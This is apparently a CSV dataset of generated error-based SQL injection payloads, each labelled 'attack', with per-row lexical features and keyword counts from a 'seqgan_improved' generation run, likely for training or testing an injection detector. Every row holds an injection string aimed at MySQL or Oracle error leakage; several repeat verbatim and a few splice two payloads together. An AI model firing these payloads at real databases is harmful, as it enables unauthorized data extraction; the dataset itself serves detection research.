label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,404,277.0,37.0,3.9278141410897223,99.0,35.0,105.0,38.0,0.3574007220216607,0.1263537906137184,0.37906137184115524,0.1371841155234657,0.0,4.0,0.0,0.0,2.0,2.0,0.0,20.0,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,405,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,0.0,4.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,406,237.0,31.0,3.6326306678122657,69.0,37.0,100.0,31.0,0.2911392405063291,0.15611814345991562,0.4219409282700422,0.1308016877637131,0.0,4.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,407,331.0,39.0,3.8675476171186403,102.0,55.0,133.0,41.0,0.3081570996978852,0.1661631419939577,0.40181268882175225,0.12386706948640483,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,408,340.0,39.0,3.8020493827541197,101.0,55.0,141.0,43.0,0.29705882352941176,0.16176470588235295,0.4147058823529412,0.1264705882352941,2.0,2.0,0.0,0.0,2.0,2.0,0.0,26.0,2.0,0.0,6.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,409,237.0,31.0,3.6326306678122657,69.0,37.0,100.0,31.0,0.2911392405063291,0.15611814345991562,0.4219409282700422,0.1308016877637131,0.0,4.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,410,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,0.0,4.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,411,237.0,31.0,3.6326306678122657,69.0,37.0,100.0,31.0,0.2911392405063291,0.15611814345991562,0.4219409282700422,0.1308016877637131,0.0,4.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,412,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,0.0,4.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,413,331.0,39.0,3.8675476171186403,102.0,55.0,133.0,41.0,0.3081570996978852,0.1661631419939577,0.40181268882175225,0.12386706948640483,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,414,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,4.0,0.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,415,302.0,36.0,3.766843757866912,100.0,35.0,125.0,42.0,0.33112582781456956,0.11589403973509933,0.4139072847682119,0.1390728476821192,0.0,4.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,416,599.0,43.0,3.937507517696072,201.0,89.0,234.0,75.0,0.335559265442404,0.14858096828046743,0.39065108514190316,0.12520868113522537,2.0,4.0,0.0,0.0,4.0,3.0,0.0,44.0,3.0,2.0,11.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,9.0,3.0,0.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,417,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,0.0,4.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,418,237.0,31.0,3.6326306678122657,69.0,37.0,100.0,31.0,0.2911392405063291,0.15611814345991562,0.4219409282700422,0.1308016877637131,0.0,4.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,419,331.0,39.0,3.8675476171186403,102.0,55.0,133.0,41.0,0.3081570996978852,0.1661631419939577,0.40181268882175225,0.12386706948640483,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,420,237.0,31.0,3.6326306678122657,69.0,37.0,100.0,31.0,0.2911392405063291,0.15611814345991562,0.4219409282700422,0.1308016877637131,0.0,4.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,421,331.0,39.0,3.8675476171186403,102.0,55.0,133.0,41.0,0.3081570996978852,0.1661631419939577,0.40181268882175225,0.12386706948640483,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,422,302.0,36.0,3.766843757866912,100.0,35.0,125.0,42.0,0.33112582781456956,0.11589403973509933,0.4139072847682119,0.1390728476821192,0.0,4.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,423,657.0,43.0,3.824302123885515,186.0,103.0,273.0,95.0,0.2831050228310502,0.1567732115677321,0.4155251141552511,0.1445966514459665,2.0,2.0,0.0,0.0,2.0,3.0,0.0,54.0,2.0,0.0,7.0,26.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,3.0,0.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,424,302.0,36.0,3.766843757866912,100.0,35.0,125.0,42.0,0.33112582781456956,0.11589403973509933,0.4139072847682119,0.1390728476821192,0.0,4.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,425,302.0,36.0,3.766843757866912,100.0,35.0,125.0,42.0,0.33112582781456956,0.11589403973509933,0.4139072847682119,0.1390728476821192,0.0,4.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,426,331.0,39.0,3.8675476171186403,102.0,55.0,133.0,41.0,0.3081570996978852,0.1661631419939577,0.40181268882175225,0.12386706948640483,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,427,331.0,39.0,3.8675476171186403,102.0,55.0,133.0,41.0,0.3081570996978852,0.1661631419939577,0.40181268882175225,0.12386706948640483,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,428,237.0,31.0,3.6326306678122657,69.0,37.0,100.0,31.0,0.2911392405063291,0.15611814345991562,0.4219409282700422,0.1308016877637131,0.0,4.0,0.0,0.0,0.0,2.0,0.0,18.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,429,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,0.0,4.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
